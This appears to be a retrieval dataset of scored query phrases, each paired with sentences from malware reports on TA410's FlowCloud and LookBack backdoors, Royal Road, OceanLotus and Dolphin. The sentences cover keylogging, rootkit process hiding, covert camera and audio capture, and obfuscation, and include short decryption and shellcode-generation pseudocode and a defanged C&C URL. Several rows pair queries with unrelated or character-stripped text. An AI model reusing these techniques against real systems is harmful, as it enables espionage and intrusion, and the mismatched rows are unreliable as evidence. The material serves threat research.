backdoor’s components records mouse and keyboard activity to a database.|0.856899123674084|['Set up monitoring of the clipboard Collected clipboard content is stored along with information about the current foreground window.', 'This information can help attackers understand the data by contextualizing it.', 'FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.', 'Another of the backdoors components records mouse and keyboard activity to a database.', 'It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english named pipe.', 'Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.']
with the keylogger component of the driver (described in the next section) by reading data from the \\.\pipe\namedpipe_keymousespy_english named pipe.|0.8338249548588993|['This information can help attackers understand the data by contextualizing it.', 'FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.', 'Another of the backdoors components records mouse and keyboard activity to a database.', 'It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english named pipe.', 'Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.']
handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.|0.9051607702201099|['Driver (hidmouse.sys) FlowClouds driver serves a dual purpose: it acts as both a keylogger and a rootkit.', 'It accomplishes this mainly by hijacking native drivers handler functions for specific I/O control codes and replacing them with its own: Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0) Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0) Device control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy) The driver also provides kernel-level functionalities to be used by the RAT.', 'They can be invoked via IO control codes or by writing to specific registry keys.', 'This module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC.', 'Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.', 'Keylogging In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.', 'This ensures that the driver doesnt interfere in a way that could be noticeable by the user.', 'These events are then parsed to the format used by the backdoors keymouse_manager and written to the named pipe \\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_english.', 'Rootkit After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.', 'The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager.', 'As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.']
exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604|0.8648946523369151|['Since 2018, we have seen the following targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission 2/26Figure 1.', 'Map of countries and verticals targeted by TA410 Initial compromise and typical TTPs If we exclude the different backdoors, the three teams use a similar modus operandi.', 'They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.', 'This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.', 'The public-facing application compromise approach is what we have seen the most.', 'Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.', 'They then dropped an ASPX webshell that was used to install other malicious components.', 'These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin.', 'In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.', 'In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan.', 'This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021.']
The public-facing application compromise approach|0.7884963158705808|['In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China.', 'Since 2018, we have seen the following targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company LookingFrog: Diplomatic missions, charity, government and industrial manufacturing JollyFrog: Education, church, military, diplomatic mission 2/26Figure 1.', 'Map of countries and verticals targeted by TA410 Initial compromise and typical TTPs If we exclude the different backdoors, the three teams use a similar modus operandi.', 'They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.', 'This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.', 'The public-facing application compromise approach is what we have seen the most.', 'Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.', 'They then dropped an ASPX webshell that was used to install other malicious components.', 'These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin.', 'In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.', 'In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan.']
These were either dropped directly via the webshell or downloaded from a remote server|0.7684974957444508|['They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint.', 'This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.', 'The public-facing application compromise approach is what we have seen the most.', 'Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.', 'They then dropped an ASPX webshell that was used to install other malicious components.', 'These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin.', 'In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.', 'In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan.', 'This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in ESET Threat Report T3 2021.', 'This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists.', 'In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec.']
The communications module then downloads the main backdoor module,|0.7517390898691043|['Decompiled view of the function used to encrypt and decrypt the embedded module The SodomNormal component tries to read configuration information from a sodom.ini file.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.', 'A unique victim ID is then generated from the victims CPUID, username, and IP address.', 'This is sent to the server along with the computers name and the configuration data.', 'The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.', 'Unfortunately, we couldnt obtain this module.', 'Communication protocol LookBack can communicate over HTTP or via its normal protocol.', 'In either case, the data being transferred is the same.', 'LookBacks normal protocol uses raw TCP sockets and a custom message format described in Table 4.', 'This message is composed of eight header fields, followed by a body of variable length.']
The communications module then downloads the main backdoor module,|0.7517390898691043|['The encryption/decryption function, shown in Figure 20, always uses the same key.Figure 20.', 'Decompiled view of the function used to encrypt and decrypt the embedded moduleThe SodomNormal component tries to read configuration information from asodom.inifile.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.A unique victim ID is then generated from the victims CPUID, username, and IP address.', 'This is sent to the server along with the computers name and the configuration data.', 'The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.', 'Unfortunately, we couldnt obtain this module.Communication protocolLookBack can communicate over HTTP or via its normal protocol.', 'In either case, the data being transferred is the same.LookBacks normal protocol uses raw TCP sockets and a custom message format described in Table 4.', 'This message is composed of eight header fields, followed by a body of variable length.', 'The message body is encrypted with the function previously described for the SodomNormal resource in the loader (Figure 20).', 'The encrypted data is then compressed with the deflate algorithm via thecompressfunction of the statically linked zlib.Table 4.']
Encoded Royal Road payload|0.8380910799301959|['Royal Road!', 'Re:Dive nao-sec.org/2021/01/royal-road-redive.html nao_sec HomeArchiveAbout 2021-01-04 1/16Abstract We introduced the Royal Road RTF Weaponizer in our previous blog [1] (and the presented at Japan Security Analyst Conference 2020 and CPX 360 CPRCon 2020).', 'Royal Road is a tool shared by many targeted attack groups believed to belong to China.', 'Its been a year since our previous blog, and Royal Road is still in use.', 'Here, we will introduce the Royal Road-related attacks observed during 2020.', 'Previous Blog Lets briefly review the previous blog.']
Encoded Royal Road payload|0.8380910799301959|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
Encoded Royal Road payload|0.7566089197686934|['6.', '[Online].', 'Available: https://blog.talosintelligence.com/2017/05/konni-malware- 21.', '[Online].', 'Available: https://nao-sec.org/2020/01/an-overhead-view-of-the- under-radar-for-years.html.', 'royal-road.html.', '7.', '[Online].', 'Available: https://blog.malwarebytes.com/threat-analysis/2020/03/ 22.', '[Online].', 'Available: https://malpedia.caad.fkie.fraunhofer.de/details/win.']
deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis|0.8562604815010033|['URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document The identical encrypted file was also downloaded from http://114.55.109[.', ']199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper version 4.1.3 (SHA1: 014421BDB1EA105A6DF0C27FC114819FF3637704).', 'A summary of the compromise chain is provided in Figure 6.', '5/26Figure 6.', 'Compromise chain from the Royal Road document to FlowCloud FlowCloud FlowCloud is a complex implant written in C++.', 'It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis.', 'Multiple versions of FlowCloud have been identified since 2020, most notably versions 4.1.3 and 5.0.1 described by Proofpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.', 'This deployment process is very similar to the one described by Proofpoint for version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.']
deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis|0.8562604815010033|['This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section.Figure 5.', 'URL requests seen by the VirusTotal sandbox during execution of the malicious RTF documentThe identical encrypted file was also downloaded fromhttp://114.55.109[.', ']199:56022/SL3716/S8437AEB.DATby a FlowCloud dropper version 4.1.3 (SHA1:014421BDB1EA105A6DF0C27FC114819FF3637704).', 'A summary of the compromise chain is provided in Figure 6.Figure 6.', 'Compromise chain from the Royal Road document to FlowCloudFlowCloudFlowCloud is a complex implant written in C++.', 'It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis.', 'Multiple versions of FlowCloud have been identified since 2020, most notably versions4.1.3and5.0.1described by Proofpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.This deployment process is very similar to the one described byProofpointfor version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages.']
The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.|0.8824035070635776|['Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.', 'This deployment process is very similar to the one described by Proofpoint for version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.', 'Loader (ClientLdrExe) The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.', 'Table 1.', 'Contents of the droppers resources Resource ID Role Internal name 100 FlowCloud RAT DLL fcClientDll 101 32-bit rootkit driver Driver 102 64-bit rootkit driver Driver 6/26Resource ID Role Internal name 103 DLL hijacking vulnerable app N/A 104 Shellcode loaded by the malicious library in the DLL hijacking SETLANG_dlcore 105 Shellcode that loads fcClient (unused) N/A 106 Final dropper stage fcClient 107 32-bit persistence module fcClientWD_x86 108 64-bit persistence module fcClientWD_x64 109 Legitimate library used for module stomping slam 110 DLL used for hijacking XXXModule_dlcore0 1000 Protobuf serialized FlowCloud configuration N/A 1001 Dropper configuration N/A 2000 Used as an alternative or extension to resource 2001 N/A 2001 Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000 Installation configuration N/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.']
The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.|0.8824035070635776|['Multiple versions of FlowCloud have been identified since 2020, most notably versions4.1.3and5.0.1described by Proofpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.This deployment process is very similar to the one described byProofpointfor version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.Table 1.', 'Contents of the droppers resourcesResource IDRoleInternal name100FlowCloud RAT DLLfcClientDll10132-bit rootkit driverDriver10264-bit rootkit driverDriver103DLL hijacking vulnerable appN/A104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore105Shellcode that loadsfcClient(unused)N/A106Final dropper stagefcClient10732-bit persistence modulefcClientWD_x8610864-bit persistence modulefcClientWD_x64109Legitimate library used for module stompingslam110DLL used for hijackingXXXModule_dlcore01000Protobuf serialized FlowCloud configurationN/A1001Dropper configurationN/A2000Used as an alternative or extension to resource 2001N/A2001Path to the registry key for the PrintProcessor service (used by the driver)N/A10000Installation configurationN/AIn the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.']
In some cases, they are then re-encrypted but with a different key|1.0|['Loader (ClientLdrExe) The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.', 'Table 1.', 'Contents of the droppers resources Resource ID Role Internal name 100 FlowCloud RAT DLL fcClientDll 101 32-bit rootkit driver Driver 102 64-bit rootkit driver Driver 6/26Resource ID Role Internal name 103 DLL hijacking vulnerable app N/A 104 Shellcode loaded by the malicious library in the DLL hijacking SETLANG_dlcore 105 Shellcode that loads fcClient (unused) N/A 106 Final dropper stage fcClient 107 32-bit persistence module fcClientWD_x86 108 64-bit persistence module fcClientWD_x64 109 Legitimate library used for module stomping slam 110 DLL used for hijacking XXXModule_dlcore0 1000 Protobuf serialized FlowCloud configuration N/A 1001 Dropper configuration N/A 2000 Used as an alternative or extension to resource 2001 N/A 2001 Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000 Installation configuration N/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.', 'The samples we analyzed all store their files in the %ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\ directory; we believe that this is the default value.', 'FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.', 'Figure 7 presents a graphical overview of the deployment process and its elements.']
In some cases, they are then re-encrypted but with a different key|1.0|['The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.Table 1.', 'Contents of the droppers resourcesResource IDRoleInternal name100FlowCloud RAT DLLfcClientDll10132-bit rootkit driverDriver10264-bit rootkit driverDriver103DLL hijacking vulnerable appN/A104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore105Shellcode that loadsfcClient(unused)N/A106Final dropper stagefcClient10732-bit persistence modulefcClientWD_x8610864-bit persistence modulefcClientWD_x64109Legitimate library used for module stompingslam110DLL used for hijackingXXXModule_dlcore01000Protobuf serialized FlowCloud configurationN/A1001Dropper configurationN/A2000Used as an alternative or extension to resource 2001N/A2001Path to the registry key for the PrintProcessor service (used by the driver)N/A10000Installation configurationN/AIn the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.', 'The samples we analyzed all store their files in the%ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\directory; we believe that this is the default value.', 'FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g.,rebare.dllwhich could be mistaken forrebar.dll) or innocuous looking (e.g.,AC146142) to avoid suspicion.Figure 7 presents a graphical overview of the deployment process and its elements.', 'We explain each of the steps in further detail in the upcoming sections.Figure 7.']
Base64-encoded strings|0.7816227854077806|['Figure 4.', 'Dolphin evolution timeline November 2021 version 2.0 Version 2.0 introduced the following changes to the version found in April 2021: 6/8Dynamic resolution of suspicious APIs instead of static imports (for example GetAsyncKeyState) added Shellcode capability finished and improved Persisted shellcode stored in files instead of registry Persisted shellcode loaded and executed on Dolphin startup (previously missing) Portable device file exfiltration capability finished and improved Exfiltration by extensions added Recognition of internal memory and SD cards (from device ID) added Command to get files from portable devices effectively a NOP Device/drive detection and file exfiltration improved Dolphin now unconditionally creates directory listings and exfiltrates files by extension every 30 minutes for all drives and devices (fixed drives, removable drives, portable devices).', 'Previously, it was just for removable drives; fixed drives were disabled by default and the code used for accessing portable devices was buggy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and commands related to it the credential stealing and Google account commands were removed.', 'Most strings in this version are base64 encoded.', 'January 2022 version 3.0 In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.']
This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC|1.0000000000000002|['This corroborates the observation by Proofpoint researchers.', 'This module is embedded in the librarys resource section and encrypted with an algorithm similar to RC4.', 'The encryption/decryption function, shown in Figure 20, always uses the same key.', 'Figure 20.', 'Decompiled view of the function used to encrypt and decrypt the embedded module The SodomNormal component tries to read configuration information from a sodom.ini file.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.', 'A unique victim ID is then generated from the victims CPUID, username, and IP address.', 'This is sent to the server along with the computers name and the configuration data.', 'The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.', 'Unfortunately, we couldnt obtain this module.']
the self-decrypting DLL,|0.7938865963333279|['The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.']
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme|0.9102493348629656|['This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.']
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme|0.9102493348629656|['It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the\\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_englishnamed pipe.Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using theCCameraDSclass from OpenCV.The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by thedecibel_limitfield of theaudio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly definedto be anywhere between 50 and 70dB by various sources).Self-decrypting DLL (setlangloc.dat)The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions ofLoadLibraryand calls the loaded modulesstartModuleexport.for (int i=0; i < ciphertext_length; i++)    plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFFFigure 16.', 'Pseudocode for the DLL decryption routineThis newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own:Covers its tracks by overwriting the code previously modified by the malicious library with a useless call tolstrlenW.Base64-encoded strings are used for function imports (viaGetProcAddress) and only decoded as needed.Exits if the processs executable is not the expected DLL hijacking target (e.g.,setlang.exe).The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.', 'This code inside the new process launches a thread that decrypts and loads thefcClientmodule before calling itsstartModuleexport.']
Self-decrypting DLL|0.7938514540895094|['The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.']
The loaded shellcode is a self-decrypting DLL.|0.8177778476979808|['The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.']
The decrypted shellcode|0.7568712481409728|['The McUtil.dll variant uses a different technique.', 'At first glance, it looks as if like the main function does nothing malicious, but in fact it replaces the .text section of the legitimate mcoemcpy.exe, a side-loaded binary.', 'It generates shellcode whose purpose is to call the function reading the encrypted stage-two shellcode in the mcscentr.adf file.', '12OceanLotus Old techniques, new backdoor The following pseudocode is used to create the shellcode: x = False i = 0 buff = genRandom() opc1 = [0x58,0x59,0x5a,0x5b] opc2 = [0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57] opc3 = [0x90,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48, 0x49,0x4a,0x4b] while i < len(buff): currentChar = buff[i] if currentChar < 0xc8: buff[i] = opc1[currentChar % len(opc1)] else: if x: buff[i] = opc2[currentChar % len(opc2)] else: buff[i] = opc3[currentChar % len(opc3)] x = x == False i+=1 The result is the following assembly listing: Figure 9 Generated shellcode Stage 2 to Stage 4 Shellcode, Launcher and Shellcode again The shellcode decrypts and loads the library {E1E4CBED-5690-4749-819D-24FB660DF55F}.dll.', 'The library retrieves its resource and tries to start the service DeviceAssociationService.', 'The decrypted data also contains shellcode.', 'The latter decrypts the final layer: the backdoor.', '13OceanLotus Old techniques, new backdoor The variant {92BA1818-0119-4F79-874E-E3BF79C355B8}.dll checks whether rastlsc.exe was executed with krv as the first parameter.', 'If so, then a job is created and rastlsc.exe is executed again, but without the parameter.', 'Stage 5 The backdoor, {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll The malware first tries to retrieve its resource and decrypt it using RC4.', 'The decrypted resource contains an interesting piece of information, used to configure the backdoor.']
into the shellcode that will decompress and load the Korplug payload.|0.8088350809789995|['Despite being well known, it is still in use and we have observed TA410 using it as recently as in April 2021.', 'In the case of TA410, Korplug arrives as a RARSFX archive, generally named m.exe, containing three files: qrt.dll: A custom loader.', 'qrtfix.exe: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking.', 'qrt.dll.usb: The Korplug shellcode.', 'The loader allocates memory using VirtualAlloc and copies the content of qrt.dll.usb there.', 'Then it jumps right into the shellcode that will decompress and load the Korplug payload.', 'QuasarRAT QuasarRAT is a full-featured backdoor freely available on GitHub.', 'It is used by numerous threat actors who perform cyberespionage or cybercrime.', 'TA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers.', 'Named sll.exe, this downloader is digitally signed with the certificate seen in Figure 23.', 'The certificate is likely stolen and belongs to (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252.']
